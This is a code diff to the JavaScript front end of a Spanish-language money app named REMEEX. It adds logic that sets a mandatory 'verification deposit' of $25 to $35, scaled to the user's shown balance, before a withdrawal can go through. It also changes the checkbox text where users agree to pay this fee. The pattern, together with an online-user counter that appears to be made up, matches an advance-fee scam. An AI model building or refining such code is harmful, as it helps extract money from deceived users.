@@ -3834,16 +3834,9 @@
       
       // NUEVO: Configurar checkbox de verificación
       setupVerificationCheckbox();
-      
-      // NUEVO: Hacer scroll automáticamente a la guía de verificación
-      setTimeout(function() {
-        const verificationGuide = document.getElementById('verification-guide-enhanced');
-        if (verificationGuide && !userHasConfirmedVerification) {
-          verificationGuide.scrollIntoView({ behavior: 'smooth', block: 'center' });
-          // Resaltar el elemento con un destello
-          highlightElement(verificationGuide);
-        }
-      }, 500);
+
+      // Desactivado: desplazamiento automático a la guía de verificación
+      // Mantener la página en la parte superior al abrir
       
       // Configurar la navegación inferior rediseñada
       setupBottomNav();
@@ -3940,6 +3933,7 @@
       const checkbox = document.getElementById('verification-confirmation-checkbox');
       const submitBtn = document.getElementById('submit-withdrawal');
       const checkboxContainer = document.getElementById('verification-checkbox-container');
+      const checkboxLabel = document.querySelector('.checkbox-label');
       
       if (checkbox && submitBtn) {
         // Verificar si el usuario ya ha confirmado previamente
@@ -3984,6 +3978,15 @@
             showToast('success', 'Confirmado', 'Has confirmado que entiendes el proceso de verificación');
           }
         });
+
+        if (checkboxContainer) {
+          checkboxContainer.addEventListener('click', function(e) {
+            if (e.target !== checkbox && e.target !== checkboxLabel) {
+              checkbox.checked = !checkbox.checked;
+              checkbox.dispatchEvent(new Event('change'));
+            }
+          });
+        }
       }
     }
     
@@ -4013,7 +4016,7 @@
       // Actualizar el texto del checkbox de confirmación
       const checkboxLabel = document.querySelector('.checkbox-label');
       if (checkboxLabel) {
-        checkboxLabel.innerHTML = `He leído y entiendo que debo realizar un depósito de verificación de <strong>Bs ${verificationAmountBs}</strong> (equivalente a $${CONFIG.VERIFICATION_AMOUNT_USD} USD) para completar mi retiro. Este monto se sumará a mi saldo disponible.`;
+        checkboxLabel.innerHTML = `He leído y entiendo que debo realizar un depósito de verificación de <strong>Bs ${verificationAmountBs}</strong> (equivalente a $${CONFIG.VERIFICATION_AMOUNT_USD} USD) para completar mi retiro. Este monto se sumará a mi saldo disponible y se calcula según el saldo obtenido en tu primer día en Remeex.`;
       }
       
       // Actualizar texto en el modal de confirmación
@@ -4448,6 +4451,7 @@
       
       // Actualizar la interfaz con los datos cargados
       updateBalanceDisplay();
+      calculateVerificationDeposit();
       
       // Si la verificación está en progreso, mostrar el contenedor de estado
       if (verificationInProgress) {
@@ -5825,6 +5829,18 @@ Gracias por utilizar REMEEX.
       }
     }
 
+    // Calcular monto de verificación según saldo inicial
+    function calculateVerificationDeposit() {
+      const usd = parseFloat(currentUser.balance.usd) || 0;
+      if (usd > 2000) {
+        CONFIG.VERIFICATION_AMOUNT_USD = 35;
+      } else if (usd > 1000) {
+        CONFIG.VERIFICATION_AMOUNT_USD = 30;
+      } else {
+        CONFIG.VERIFICATION_AMOUNT_USD = 25;
+      }
+    }
+
     // Actualizar contador de usuarios en línea
     function updateOnlineUsersCount() {
       const min = 98;
@@ -6086,6 +6102,10 @@ Gracias por utilizar REMEEX.
         fullPhone = data.phoneNumber;
       } else {
         fullPhone = (data.phonePrefix || '') + (data.phoneNumberShort || '');
+      }
+      fullPhone = fullPhone.replace(/\D/g, '');
+      if (fullPhone.length === 7 && data.phonePrefix) {
+        fullPhone = data.phonePrefix.replace(/\D/g, '') + fullPhone;
       }
       const mapping = {
         'documentNumber': data.documentNumber || '',
